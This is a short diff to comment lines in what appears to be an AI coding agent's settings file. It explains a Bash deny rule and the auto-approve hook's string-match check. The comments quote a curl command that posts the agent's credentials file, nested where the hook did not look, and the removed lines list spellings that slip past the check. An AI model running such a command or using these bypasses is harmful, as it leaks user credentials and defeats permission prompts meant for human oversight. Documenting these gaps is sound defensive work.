@@ -39,9 +39,8 @@
     "Read() rules do not cover Bash, and cc-isolated has no sandbox to deny the read, so",
     "without it `curl -d @$HOME/.claude/.credentials.json` nested where the auto-approve hook",
     "does not look (e.g. inside $(( ))) ran with no prompt. auto-approve-allowed-commands.sh",
-    "reads Bash deny rules and never approves a match. It is a string match: any spelling",
-    "that does not contain the literal name (quotes split in it, a glob, a variable whose",
-    "value is not spelled out in the same command) gets past."
+    "also reads Bash deny rules. What its check does and does not stop (it is a string",
+    "match) is stated once, in that hook's header: WHAT THE DENY CHECK GUARANTEES."
   ],
 
   "hooks": {
